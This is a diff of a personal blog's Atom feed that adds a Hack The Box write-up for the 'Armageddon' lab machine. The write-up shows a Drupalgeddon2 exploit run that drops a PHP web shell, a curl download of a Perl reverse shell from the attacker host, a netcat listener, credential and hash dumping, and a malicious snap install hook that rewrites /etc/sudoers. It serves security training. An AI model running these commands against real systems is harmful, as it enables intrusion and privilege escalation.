@@ -1,4 +1,262 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2021-07-23T20:27:25+00:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">Ryan Kozak</title><subtitle>hacking, web development, $other</subtitle><author><name>Ryan Kozak</name></author><entry><title type="html">Hack The Box - Ophiuchi</title><link href="http://0.0.0.0:4000/hack-the-box-ophiuchi/" rel="alternate" type="text/html" title="Hack The Box - Ophiuchi" /><published>2021-07-16T00:00:00+00:00</published><updated>2021-07-16T21:40:59+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-ophiuchi</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-ophiuchi/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/badge.png&quot; alt=&quot;badge&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2021-07-26T15:01:01+00:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">Ryan Kozak</title><subtitle>hacking, web development, $other</subtitle><author><name>Ryan Kozak</name></author><entry><title type="html">Hack The Box - Armageddon</title><link href="http://0.0.0.0:4000/hack-the-box-armageddon/" rel="alternate" type="text/html" title="Hack The Box - Armageddon" /><published>2021-07-24T00:00:00+00:00</published><updated>2021-07-26T14:46:36+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-armageddon</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-armageddon/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/armageddon/badge.png&quot; alt=&quot;badge&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;Armageddon is an Easy level box, and it was about as standard as standard can be. The initial foothold was straight a forward Drupal exploit, and the name of the box is a massive hint (&lt;em&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/44449&quot;&gt;Druppalgeddon2&lt;/a&gt;&lt;/em&gt;). After gaining the initial foothold, enumerating MySQL and credential stuffing gains us user privileges. All of this is pretty basic. The privilege escalation is achieved through &lt;em&gt;&lt;a href=&quot;https://gtfobins.github.io/gtfobins/snap/&quot;&gt;snap&lt;/a&gt;&lt;/em&gt;, which was interesting to me since I’d never done this before. It was not difficult to identify or exploit though.&lt;/p&gt;
+
+&lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;
+&lt;h2 id=&quot;port-scan-nmapautomator&quot;&gt;Port Scan: nmapAutomator&lt;/h2&gt;
+&lt;p&gt;We begin our reconnaissance by running &lt;em&gt;&lt;a href=&quot;https://github.com/21y4d/nmapAutomator&quot;&gt;nmapAutomator&lt;/a&gt;&lt;/em&gt; via &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo ./nmapAutomator.sh 10.10.10.233 All&lt;/code&gt;. Among many other things, this runs our port scans with increasing comprehensiveness.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Making a script scan on all ports
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-10 11:47 EDT
+Nmap scan report for 10.10.10.233
+Host is up (0.083s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey:
+|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
+|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
+|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
+80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Welcome to  Armageddon |  Armageddon
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The open ports on the machine are &lt;strong&gt;22&lt;/strong&gt; and &lt;strong&gt;80&lt;/strong&gt;. These are all we’ll need to proceed through the rest of the box. Let’s take a look at what’s on the web port.&lt;/p&gt;
+
+&lt;h3 id=&quot;port-80&quot;&gt;Port 80&lt;/h3&gt;
+&lt;p&gt;Nmap has indicated already that it’s a Drupal 7 site.&lt;br /&gt;
+&lt;img src=&quot;/wp-content/uploads/2021/07/armageddon/0_drupal_page.png&quot; alt=&quot;main_page&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 1:&lt;/strong&gt; Nice little chicken drawing&lt;/p&gt;
+
+&lt;p&gt;We can view the &lt;code class=&quot;highlighter-rouge&quot;&gt;CHANGELOG.txt&lt;/code&gt; file to get a more specific version number. In this case it is on version &lt;code class=&quot;highlighter-rouge&quot;&gt;7.56&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&quot;/wp-content/uploads/2021/07/armageddon/0_drupal_version.png&quot; alt=&quot;drupal_version&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 2:&lt;/strong&gt; Druapl version via CHANGELOG.txt&lt;/p&gt;
+
+&lt;p&gt;Running a quick &lt;code class=&quot;highlighter-rouge&quot;&gt;searchsploit drupal&lt;/code&gt; reveals that versions &lt;code class=&quot;highlighter-rouge&quot;&gt;7.58&lt;/code&gt; and below are susceptible to &lt;em&gt;Drupalgeddon2&lt;/em&gt;, a remote code execution exploit.&lt;br /&gt;
+&lt;img src=&quot;/wp-content/uploads/2021/07/armageddon/searchsploit_drupal.png&quot; alt=&quot;searchsploit_drupal&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 3:&lt;/strong&gt; Searchsploit reveals this site may be suseptable to Drupalgeddon2.&lt;/p&gt;
+
+&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
+&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial foothold&lt;/h2&gt;
+&lt;p&gt;To gain our initial foothold on the machine we’ll use the exploit above. The first order of business is to add &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.233&lt;/code&gt; to our &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file as &lt;code class=&quot;highlighter-rouge&quot;&gt;armageddon.htb&lt;/code&gt;. After this we’ll install the required gem dependency via &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo gem install highline&lt;/code&gt;. After we transfer the exploit to the home directory, we’ll execute it.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ ruby 44449.rb http://armageddon.htb
+ruby: warning: shebang line ending with \r may cause problems
+[*] --==[::#Drupalggedon2::]==--
+--------------------------------------------------------------------------------
+[i] Target : http://armageddon.htb/
+--------------------------------------------------------------------------------
+[+] Found  : http://armageddon.htb/CHANGELOG.txt    (HTTP Response: 200)
+[+] Drupal!: v7.56
+--------------------------------------------------------------------------------
+[*] Testing: Form   (user/password)
+[+] Result : Form valid
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+[*] Testing: Clean URLs
+[!] Result : Clean URLs disabled (HTTP Response: 404)
+[i] Isn't an issue for Drupal v7.x
+--------------------------------------------------------------------------------
+[*] Testing: Code Execution   (Method: name)
+[i] Payload: echo DMGWWYDY
+[+] Result : DMGWWYDY
+[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
+--------------------------------------------------------------------------------
+[*] Testing: Existing file   (http://armageddon.htb/shell.php)
+[i] Response: HTTP 404 // Size: 5
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+[*] Testing: Writing To Web Root   (./)
+[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
+[+] Result : &amp;lt;?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2&amp;gt;&amp;amp;1' ); }
+[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
+--------------------------------------------------------------------------------
+[i] Fake PHP shell:   curl 'http://armageddon.htb/shell.php' -d 'c=hostname'
+armageddon.htb&amp;gt;&amp;gt; whoami
+apache
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The web shell above isn’t great, so we’ll simply use it to download and execute a reverse shell. In this machine’s case, we determined a Perl shell worked well.&lt;/p&gt;
+
+&lt;p&gt;Below we see the commands to transfer the shell to our attacking machine’s Apache server, and start the server. The last &lt;code class=&quot;highlighter-rouge&quot;&gt;vim&lt;/code&gt; command includes modifying the listening IP and port.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──(kali㉿kali)-[/var/www/html]
+└─$ sudo cp /usr/share/webshells/perl-reverse-shell.pl /var/www/html/perl-reverse-shell.pl
+┌──(kali㉿kali)-[/var/www/html]
+└─$ sudo service apache2 start
+
+┌──(kali㉿kali)-[/var/www/html]
+└─$ sudo vim perl-reverse-shell.pl
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We’ve modified the following portion of &lt;em&gt;perl-reverse-shell.pl&lt;/em&gt;,&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-Perl&quot;&gt;# Where to send the reverse shell.  Change these.
+my $ip = '10.10.14.3';
+my $port = 443;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;First we start a Netcat listener on port 443 of the attacking machine via &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo nc -lnvp 443&lt;/code&gt;, and then use the web shell we’ve achieved on the victim machine to download and execute our perl reverse shell,&lt;/p&gt;
+
+&lt;p&gt;Victim downloads and executes reverse shell.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;armageddon.htb&amp;gt;&amp;gt; curl http://10.10.14.3/perl-reverse-shell.pl --output shell.pl
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  3712  100  3712    0     0   4141      0 --:--:-- --:--:-- --:--:--  4138
+armageddon.htb&amp;gt;&amp;gt; perl shell.pl
+Content-Length: 0
+Connection: close
+Content-Type: text/html
+
+Content-Length: 40
+Connection: close
+Content-Type: text/html
+
+Sent reverse shell to 10.10.14.3:443&amp;lt;p&amp;gt;
+armageddon.htb&amp;gt;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Attacker catches shell.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──(kali㉿kali)-[/var/www/html]
+└─$ sudo nc -lnvp 443             
+listening on [any] 443 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.10.233] 34110
+ 19:18:10 up  2:32,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+Linux armageddon.htb 3.10.0-1160.6.1.el7.x86_64 #1 SMP Tue Nov 17 13:59:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
+/
+apache: cannot set terminal process group (-1): Inappropriate ioctl for device
+apache: no job control in this shell
+apache-4.2$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;user-flag&quot;&gt;User Flag&lt;/h2&gt;
+&lt;p&gt;The first thing to check after compromising a web application is often the content of its database. We’ll examine Drupal’s &lt;code class=&quot;highlighter-rouge&quot;&gt;settings.php&lt;/code&gt; file to view the database credentials,&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-PHP&quot;&gt;$databases = array (
+  'default' =&amp;gt;
+  array (
+    'default' =&amp;gt;
+    array (
+      'database' =&amp;gt; 'drupal',
+      'username' =&amp;gt; 'drupaluser',
+      'password' =&amp;gt; 'CQHEy@9M*m23gBVj',
+      'host' =&amp;gt; 'localhost',
+      'port' =&amp;gt; '',
+      'driver' =&amp;gt; 'mysql',
+      'prefix' =&amp;gt; '',
+    ),
+  ),
+);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now, logging into MySQL with username &lt;code class=&quot;highlighter-rouge&quot;&gt;drupaluser&lt;/code&gt; and password &lt;code class=&quot;highlighter-rouge&quot;&gt;CQHEy@9M*m23gBVj&lt;/code&gt; allows us to dump the users table and view the password hashes.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apache-4.2$ mysql -u drupaluser -p drupal
+mysql -u drupaluser -p drupal
+Enter password: CQHEy@9M*m23gBVj
+select * from users;
+exit();
+ERROR 1064 (42000) at line 2: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'exit()' at line 1
+uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
+0                                               NULL    0       0       0       0       NULL            0               NULL
+1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html   1606998756      1607077194      1607076276      1       Europe/London           0       admin@armageddon.eu        a:1:{s:7:&quot;overlay&quot;;i:1;}
+apache-4.2$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We see &lt;code class=&quot;highlighter-rouge&quot;&gt;brucetherealadmin&lt;/code&gt; has a hash of &lt;code class=&quot;highlighter-rouge&quot;&gt;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&lt;/code&gt;. We can drop this hash into a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;armageddon.hash&lt;/code&gt; and try to crack it with John and the &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou.txt&lt;/code&gt; wordlist.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/armageddon/user.png&quot; alt=&quot;user&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 4:&lt;/strong&gt; Cracking the password hash for &lt;em&gt;brucetherealadmin&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;As we can see above, the password that &lt;em&gt;brucetherealadmin&lt;/em&gt; uses to login to Drupal is &lt;code class=&quot;highlighter-rouge&quot;&gt;booboo&lt;/code&gt;. If we attempt the to use those same credentials to ssh into the server, we’ll see that it’s successful.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;./images/userflag.png&quot; alt=&quot;userflag&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 5:&lt;/strong&gt; User flag by &lt;em&gt;brucetherealadmin&lt;/em&gt;’s credential reuse.&lt;/p&gt;
+
+&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;
+
+&lt;p&gt;Running &lt;em&gt;&lt;a href=&quot;https://github.com/diego-treitos/linux-smart-enumeration&quot;&gt;lse.sh&lt;/a&gt;&lt;/em&gt; reveals that we’re able to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/snap install *&lt;/code&gt; via sudo without a password.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/armageddon/ohsnap.png&quot; alt=&quot;ohsnap&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 6:&lt;/strong&gt; We are able to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/snap install *&lt;/code&gt; snap packages via sudo with no password.&lt;/p&gt;
+
+&lt;p&gt;To exploit this we’ll use &lt;code class=&quot;highlighter-rouge&quot;&gt;fpm&lt;/code&gt; to craft a malicious &lt;code class=&quot;highlighter-rouge&quot;&gt;snap&lt;/code&gt; package. On our attacking machine we’ll first install &lt;code class=&quot;highlighter-rouge&quot;&gt;fpm&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;──(kali㉿kali)-[/var/www/html]
+└─$ sudo gem install --no-document fpm                                                                                                                                                                                                 1 ⨯
+Fetching arr-pm-0.0.10.gem
+Fetching io-like-0.3.1.gem
+Fetching backports-3.21.0.gem
+Fetching ruby-xz-0.2.3.gem
+Fetching cabin-0.9.0.gem
+Fetching childprocess-0.9.0.gem
+Fetching clamp-1.0.1.gem
+Fetching stud-0.0.23.gem
+Fetching git-1.8.1.gem
+Fetching fpm-1.12.0.gem
+Fetching insist-1.0.0.gem
+Fetching mustache-0.99.8.gem
+Fetching dotenv-2.7.6.gem
+Fetching pleaserun-0.0.32.gem
+Successfully installed cabin-0.9.0
+Successfully installed backports-3.21.0
+Successfully installed arr-pm-0.0.10
+Successfully installed clamp-1.0.1
+Successfully installed childprocess-0.9.0
+Successfully installed io-like-0.3.1
+Successfully installed ruby-xz-0.2.3
+Successfully installed stud-0.0.23
+Successfully installed mustache-0.99.8
+Successfully installed insist-1.0.0
+Successfully installed dotenv-2.7.6
+Successfully installed pleaserun-0.0.32
+Successfully installed git-1.8.1
+Successfully installed fpm-1.12.0
+14 gems installed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As per the &lt;em&gt;&lt;a href=&quot;https://gtfobins.github.io/gtfobins/snap/&quot;&gt;GTFObin’s instructions&lt;/a&gt;&lt;/em&gt; we craft the packet. We’ll modify the command in those instructions to be &lt;code class=&quot;highlighter-rouge&quot;&gt;COMMAND=&quot;echo 'brucetherealadmin ALL=(ALL) NOPASSWD:/bin/bash' &amp;gt;&amp;gt; /etc/sudoers&quot;&lt;/code&gt;, so that &lt;em&gt;brucetherealadmin&lt;/em&gt; can sudo with no password at all. We then transfer this package to our Apache server’s directory as &lt;code class=&quot;highlighter-rouge&quot;&gt;oh.snap&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
+└─$ COMMAND=&quot;echo 'brucetherealadmin ALL=(ALL) NOPASSWD:/bin/bash' &amp;gt;&amp;gt; /etc/sudoers&quot;
+cd $(mktemp -d)
+mkdir -p meta/hooks
+printf '#!/bin/sh\n%s; false' &quot;$COMMAND&quot; &amp;gt;meta/hooks/install
+chmod +x meta/hooks/install
+fpm -n xxxx -s dir -t snap -a all meta
+Created package {:path=&amp;gt;&quot;xxxx_1.0_all.snap&quot;}
+
+┌──(kali㉿kali)-[/tmp/tmp.CkDpHzKVN8]
+└─$ sudo mv xxxx_1.0_all.snap /var/www/html/oh.snap                                
+
+┌──(kali㉿kali)-[/tmp/tmp.CkDpHzKVN8]
+└─$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, after downloading &lt;code class=&quot;highlighter-rouge&quot;&gt;oh.snap&lt;/code&gt; we execute &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo /usr/bin/snap install oh.snap --dangerous --devmode&lt;/code&gt; to install the package. This will allow &lt;em&gt;brucetherealadmin&lt;/em&gt; to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo /bin/bash&lt;/code&gt; and get us a root shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/armageddon/rootshell.png&quot; alt=&quot;rootshell&quot; /&gt;&lt;br /&gt;
+&lt;strong&gt;Figure 7:&lt;/strong&gt; Installing &lt;code class=&quot;highlighter-rouge&quot;&gt;oh.snap&lt;/code&gt; allows us to &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; with no password to gain a root shell.&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;This box was fairly entertaining, and very straight forward. Sometimes I don’t mind an easy one at all. Obviously the way that the root shell is achieved should be cleaned up if we cared at all about hiding our tracks :).&lt;/p&gt;
+
+&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/44449&quot;&gt;Drupalgeddon2 Exploit&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/gtfobins/snap/&quot;&gt;GTFO Bins for snap + sudo&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Drupal" /><category term="snap" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - Ophiuchi</title><link href="http://0.0.0.0:4000/hack-the-box-ophiuchi/" rel="alternate" type="text/html" title="Hack The Box - Ophiuchi" /><published>2021-07-16T00:00:00+00:00</published><updated>2021-07-26T14:46:36+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-ophiuchi</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-ophiuchi/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2021/07/ophiuchi/badge.png&quot; alt=&quot;badge&quot; /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;Ophiuchi is a Medium box with a weird name to pronounce. The initial foothold was straight forward but fun, the user flag reminds us to go back to the basics, and the root flag is a difficult mind game for those of us that haven’t even been exposed to the technology.&lt;/p&gt;
@@ -1937,232 +2195,4 @@ d41d8cd98f00b204e9800998ecf84271
   &lt;li&gt;&lt;a href=&quot;https://security.stackexchange.com/questions/212427/why-doesnt-my-systemctl-command-work&quot;&gt;https://security.stackexchange.com/questions/212427/why-doesnt-my-systemctl-command-work&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://packetstormsecurity.com/files/144749/Infoblox-NetMRI-7.1.4-Shell-Escape-Privilege-Escalation.html&quot;&gt;https://packetstormsecurity.com/files/144749/Infoblox-NetMRI-7.1.4-Shell-Escape-Privilege-Escalation.html&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&quot;&gt;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="PHP" /><category term="phpMyAdmin" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - Haystack</title><link href="http://0.0.0.0:4000/hack-the-box-haystack-writeup/" rel="alternate" type="text/html" title="Hack The Box - Haystack" /><published>2019-11-02T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-haystack</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-haystack-writeup/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/08/haystack/badge.png&quot; alt=&quot;Hack The Box Haystack&quot; /&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;intro&quot;&gt;Intro&lt;/h1&gt;
-&lt;p&gt;Haystack is retired and now we can talk about it. At first I was fairly frustrated with this box. I really didn’t enjoy it much at the beginning, but after all was said and done I did have a bit of fun. The Spanish language was a nice twist, we have to remember there are a lot of systems out there that aren’t in English. I learned a bit about the ELK stack, which before this I knew next to nothing about. All in all it was a fairly good box.&lt;/p&gt;
-
-&lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;
-&lt;h2 id=&quot;port-scan-nmap&quot;&gt;Port Scan: Nmap&lt;/h2&gt;
-&lt;p&gt;We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:/media/sf_Research#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sVC&lt;/span&gt; 10.10.10.115
-&lt;span class=&quot;go&quot;&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-26 18:48 EDT
-Nmap scan report for 10.10.10.115
-Host is up (0.38s latency).
-Not shown: 997 filtered ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
-| ssh-hostkey:
-|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
-|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
-|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
-80/tcp   open  http    nginx 1.12.2
-|_http-server-header: nginx/1.12.2
-|_http-title: Site doesn't have a title (text/html).
-9200/tcp open  http    nginx 1.12.2
-| http-methods:
-|_  Potentially risky methods: DELETE
-|_http-server-header: nginx/1.12.2
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;|_http-title: Site doesn't have a title (application/json;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UTF-8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 45.42 seconds
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ports open &lt;strong&gt;22&lt;/strong&gt;, &lt;strong&gt;80&lt;/strong&gt;, and &lt;strong&gt;9200&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;the-needle-port-80&quot;&gt;The Needle: Port 80&lt;/h2&gt;
-&lt;p&gt;We see that there’s an Nginix page hosting only an image. This is a CTF after all, so let’s check and see if there’s anything hidden in this picture.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/08/haystack/port80.png&quot; alt=&quot;Port 80&quot; /&gt;
-&lt;strong&gt;Figure 1:&lt;/strong&gt; needle.jpg displayed on port 80.&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Desktop#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;strings &lt;span class=&quot;nt&quot;&gt;-10&lt;/span&gt; needle.jpg
-&lt;span class=&quot;go&quot;&gt;paint.net 4.1.1
-%&amp;amp;'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
-&amp;amp;'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt;&lt;/span&gt;S&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;T&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;M7&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;Y
-&lt;span class=&quot;gp&quot;&gt;WEL/;&lt;/span&gt;wg-J3
-&lt;span class=&quot;go&quot;&gt;T.-UWuvFG,
